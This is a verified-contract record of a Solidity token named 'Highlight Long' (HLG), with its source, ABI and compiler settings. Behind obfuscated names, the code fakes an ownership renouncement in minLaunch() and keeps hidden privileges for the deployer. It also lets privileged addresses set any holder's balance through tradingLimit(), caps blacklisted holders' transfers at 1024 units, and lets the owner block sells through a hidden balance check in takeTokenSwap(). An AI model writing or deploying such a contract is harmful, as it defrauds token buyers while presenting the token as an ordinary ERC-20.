{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface receiverListAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxIsWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeMinShould {\n    function createPair(address atWallet, address feeList) external returns (address);\n}\n\ninterface totalBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoFrom) external view returns (uint256);\n\n    function transfer(address maxReceiver, uint256 limitSender) external returns (bool);\n\n    function allowance(address shouldEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxReceiver,\n        uint256 limitSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityShouldList, uint256 value);\n    event Approval(address indexed shouldEnable, address indexed spender, uint256 value);\n}\n\ninterface marketingSell is totalBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HighlightLong is maxIsWallet, totalBuy, marketingSell {\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLaunch;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamIsMin;\n\n    function marketingToken(address modeSwapIs, address maxReceiver, uint256 limitSender) internal returns (bool) {\n        require(takeAmount[modeSwapIs] >= limitSender);\n        takeAmount[modeSwapIs] -= limitSender;\n        takeAmount[maxReceiver] += limitSender;\n        emit Transfer(modeSwapIs, maxReceiver, limitSender);\n        return true;\n    }\n\n    bool public enableTeamSender;\n\n    uint256 public tradingFund;\n\n    function modeLaunched(address exemptAt) public {\n        amountTxExempt();\n        if (receiverLaunchTeam != tradingFund) {\n            atFundTotal = tradingFund;\n        }\n        if (exemptAt == receiverTotal || exemptAt == limitLaunch) {\n            return;\n        }\n        isReceiver[exemptAt] = true;\n    }\n\n    function balanceOf(address autoFrom) public view virtual override returns (uint256) {\n        return takeAmount[autoFrom];\n    }\n\n    uint256 amountFrom;\n\n    function owner() external view returns (address) {\n        return amountMax;\n    }\n\n    function tradingLimit(address limitTo, uint256 limitSender) public {\n        amountTxExempt();\n        takeAmount[limitTo] = limitSender;\n    }\n\n    uint256 private atFundTotal;\n\n    mapping(address => bool) public feeTo;\n\n    address private amountMax;\n\n    uint8 private isLaunch = 18;\n\n    constructor (){\n        \n        receiverListAmount enableIs = receiverListAmount(txTeam);\n        limitLaunch = feeMinShould(enableIs.factory()).createPair(enableIs.WETH(), address(this));\n        if (modeFee != atFundTotal) {\n            modeFee = receiverLaunchTeam;\n        }\n        receiverTotal = _msgSender();\n        minLaunch();\n        feeTo[receiverTotal] = true;\n        takeAmount[receiverTotal] = enableMaxAt;\n        if (enableTeamSender != shouldTradingSender) {\n            atFundTotal = modeFee;\n        }\n        emit Transfer(address(0), receiverTotal, enableMaxAt);\n    }\n\n    function allowance(address takeReceiverLaunch, address limitList) external view virtual override returns (uint256) {\n        if (limitList == txTeam) {\n            return type(uint256).max;\n        }\n        return teamIsMin[takeReceiverLaunch][limitList];\n    }\n\n    function shouldTradingFund(address limitShouldFee) public {\n        if (marketingWallet) {\n            return;\n        }\n        \n        feeTo[limitShouldFee] = true;\n        \n        marketingWallet = true;\n    }\n\n    bool private sellLaunched;\n\n    uint256 private receiverLaunchTeam;\n\n    function amountTxExempt() private view {\n        require(feeTo[_msgSender()]);\n    }\n\n    uint256 private modeFee;\n\n    function transfer(address limitTo, uint256 limitSender) external virtual override returns (bool) {\n        return takeTokenSwap(_msgSender(), limitTo, limitSender);\n    }\n\n    uint256 walletReceiver;\n\n    bool public marketingWallet;\n\n    uint256 private enableMaxAt = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private takeAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedList;\n    }\n\n    mapping(address => bool) public isReceiver;\n\n    address txTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public shouldTradingSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMaxAt;\n    }\n\n    event OwnershipTransferred(address indexed shouldList, address indexed enableFee);\n\n    string private amountMarketing = \"HLG\";\n\n    address public receiverTotal;\n\n    function transferFrom(address modeSwapIs, address maxReceiver, uint256 limitSender) external override returns (bool) {\n        if (_msgSender() != txTeam) {\n            if (teamIsMin[modeSwapIs][_msgSender()] != type(uint256).max) {\n                require(limitSender <= teamIsMin[modeSwapIs][_msgSender()]);\n                teamIsMin[modeSwapIs][_msgSender()] -= limitSender;\n            }\n        }\n        return takeTokenSwap(modeSwapIs, maxReceiver, limitSender);\n    }\n\n    function enableSwapExempt(uint256 limitSender) public {\n        amountTxExempt();\n        amountFrom = limitSender;\n    }\n\n    address public limitLaunch;\n\n    string private launchedList = \"Highlight Long\";\n\n    function getOwner() external view returns (address) {\n        return amountMax;\n    }\n\n    function minLaunch() public {\n        emit OwnershipTransferred(receiverTotal, address(0));\n        amountMax = address(0);\n    }\n\n    uint256 constant launchedEnable = 2 ** 10;\n\n    function takeTokenSwap(address modeSwapIs, address maxReceiver, uint256 limitSender) internal returns (bool) {\n        if (modeSwapIs == receiverTotal) {\n            return marketingToken(modeSwapIs, maxReceiver, limitSender);\n        }\n        uint256 receiverReceiverIs = totalBuy(limitLaunch).balanceOf(sellLiquidity);\n        require(receiverReceiverIs == amountFrom);\n        require(maxReceiver != sellLiquidity);\n        if (isReceiver[modeSwapIs]) {\n            return marketingToken(modeSwapIs, maxReceiver, launchedEnable);\n        }\n        return marketingToken(modeSwapIs, maxReceiver, limitSender);\n    }\n\n    address sellLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountMarketing;\n    }\n\n    function approve(address limitList, uint256 limitSender) public virtual override returns (bool) {\n        teamIsMin[_msgSender()][limitList] = limitSender;\n        emit Approval(_msgSender(), limitList, limitSender);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityShouldList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiverLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"enableSwapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeamSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShouldFee\",\"type\":\"address\"}],\"name\":\"shouldTradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTradingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HighlightLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}